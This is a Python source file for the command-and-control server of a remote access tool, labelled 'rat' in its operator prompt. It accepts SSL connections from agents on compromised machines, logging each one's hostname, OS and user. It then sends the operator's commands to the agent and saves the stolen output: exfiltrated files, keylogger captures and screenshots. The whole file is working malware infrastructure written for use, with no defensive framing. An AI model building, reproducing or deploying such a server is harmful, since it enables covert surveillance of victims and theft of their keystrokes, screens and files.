# écouter sur un port
# accepter connexions
# lancer threads
import socket
import ssl
from threading import Thread
from utils.logger import setup_logger
import json
import datetime

logger = setup_logger()


class SSLServer:
    def __init__(
        self, host, port, server_cert, server_key, client_cert, chunk_size=1024
    ):
        self._running = True
        self._server_socket = None
        self.host = host
        self.port = port
        self.chunk_size = chunk_size
        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self._context.verify_mode = ssl.CERT_REQUIRED
        self._context.load_cert_chain(server_cert, server_key)
        self._context.load_verify_locations(client_cert)

    def shutdown(self):

        logger.info("Shutdown requested")

        self._running = False

        if self._server_socket:
            self._server_socket.close()

    def connect(self):

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

        self._server_socket = sock

        sock.bind((self.host, self.port))

        sock.listen(5)

        sock.settimeout(1)

        print("Server listening")
        logger.info("Server listening")

        while self._running:

            try:

                conn, addr = sock.accept()

            except socket.timeout:
                continue

            try:

                sconn = self._context.wrap_socket(
                    conn,
                    server_side=True,
                )

                print("Client connected:", addr[0])
                logger.info("Client connected: %s", addr[0])

                data = self._recv_until_eof(sconn)

                client_info = json.loads(data)

                logger.info(
                    "New agent: %s | %s | %s | %s",
                    client_info["hostname"],
                    client_info["os"],
                    client_info["user"],
                    client_info["release"],
                )

                Thread(
                    target=self._handle_client,
                    args=(sconn,),
                    daemon=True,
                ).start()

            except ssl.SSLError:

                print("SSL handshake failed")
                logger.error("SSL handshake failed")

        logger.info("Server stopped")

        sock.close()

    def _recv(self, sock):

        try:

            while True:

                data = sock.recv(self.chunk_size)

                if not data:
                    print("Client disconnected")
                    logger.warning("Client disconnected")
                    break

                print(data.decode())

        except ConnectionResetError:

            print("Client forcibly closed connection")
            logger.warning("Client forcibly closed connection")

        except ssl.SSLError:

            print("SSL error")
            logger.error("SSL error")
        except Exception as e:

            print(f"Error: {e}")

        finally:

            sock.close()

    def _save_download(self, response):

        try:

            lines = response.split("\n")

            if lines[0] != "DOWNLOAD":
                print(response)
                return

            if lines[1] != "OK":
                print("\n".join(lines[1:]))
                return

            content = "\n".join(lines[2:])

            ct = datetime.datetime.now()
            filename = "downloaded_file_" + ct.strftime("%Y%m%d_%H%M%S")

            with open(filename, "w") as f:
                f.write(content)

            print(f"File saved: {filename}")

        except Exception as e:

            print("Download save error:", e)

    def _save_keylog(self, response):

        try:

            lines = response.split("\n")

            if lines[1] != "OK":
                print(response)
                return

            content = "\n".join(lines[2:])

            if not content:
                print("No keystrokes captured")
                return

            ct = datetime.datetime.now()
            filename = "keylogger_file_" + ct.strftime("%Y%m%d_%H%M%S")

            with open(filename, "w") as f:
                f.write(content)

            print(f"Keylogger saved: {filename}")

        except Exception as e:

            print("Keylogger save error:", e)

    def _save_screenshot(self, response):

        import base64
        from datetime import datetime

        try:

            lines = response.split("\n")

            if lines[1] != "OK":
                print(response)
                return

            encoded = "".join(lines[2:])

            image_bytes = base64.b64decode(encoded)

            filename = f"screenshot_" f"{datetime.now().timestamp()}.png"

            with open(filename, "wb") as f:

                f.write(image_bytes)

            print(f"Screenshot saved: {filename}")

        except Exception as e:

            print("Screenshot save error:", e)

    def _recv_until_eof(self, sock):

        buffer = ""

        while True:

            chunk = sock.recv(self.chunk_size)

            if not chunk:
                break

            buffer += chunk.decode(errors="ignore")

            if "\nEOF" in buffer:
                break

        return buffer.replace("\nEOF", "").strip()

    def _handle_client(self, sock):

        logger.info("Client handler started")

        try:

            while True:

                command = input("rat > ")

                if command.strip().lower() == "exit":
                    print("Shutting down server...")

                    self.shutdown()

                    break

                if not command:
                    continue

                sock.sendall((command + "\nEOF").encode())

                logger.info("Server sent command: %s", command)

                response = self._recv_until_eof(sock)

                if not response:
                    logger.warning("Client disconnected")

                    break

                lines = response.split("\n")

                response_type = lines[0]

                if response_type == "DOWNLOAD":

                    self._save_download(response)

                elif response_type == "KEYLOG":

                    self._save_keylog(response)

                elif response_type == "SCREENSHOT":

                    self._save_screenshot(response)

                else:

                    print(response)

                if response_type not in (
                    "SCREENSHOT",
                    "DOWNLOAD",
                    "KEYLOG",
                ):
                    logger.info("Client responded: %s", response)
                else:
                    logger.info("Client responded: with %s", response_type)

        except Exception as e:

            logger.error("Client handler error: %s", e)

        finally:

            logger.info("Closing client socket")

            sock.close()


class SSLServerThread(Thread):
    def __init__(self, server):
        super().__init__()
        self._server = server
        self.daemon = True

    def run(self):
        self._server.connect()
